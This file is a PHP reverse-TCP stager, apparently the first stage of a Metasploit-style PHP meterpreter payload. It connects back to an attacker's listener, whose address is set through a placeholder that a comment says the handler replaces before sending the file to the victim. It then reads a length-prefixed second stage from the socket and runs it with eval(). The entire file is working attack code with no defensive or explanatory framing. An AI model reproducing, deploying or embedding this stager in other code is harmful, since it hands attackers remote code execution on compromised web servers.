#<?php

error_reporting(0);
# The payload handler overwrites this with the correct LHOST before sending
# it to the victim.
$ip = '127.0.0.1';
$port = 4444;
$ipf = AF_INET;

if (FALSE !== strpos($ip, ":")) {
	# ipv6 requires brackets around the address
	$ip = "[". $ip ."]";
	$ipf = AF_INET6;
}

if (($f = 'stream_socket_client') && is_callable($f)) {
	$s = $f("tcp://{$ip}:{$port}");
	$s_type = 'stream';
} elseif (($f = 'fsockopen') && is_callable($f)) {
	$s = $f($ip, $port);
	$s_type = 'stream';
} elseif (($f = 'socket_create') && is_callable($f)) {
	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
	$res = @socket_connect($s, $ip, $port);
	if (!$res) { die(); }
	$s_type = 'socket';
} else {
	die('no socket funcs');
}
if (!$s) { die('no socket'); }

switch ($s_type) { 
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
	switch ($s_type) { 
	case 'stream': $b .= fread($s, $len-strlen($b)); break;
	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
	}
}

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
eval($b);
die();
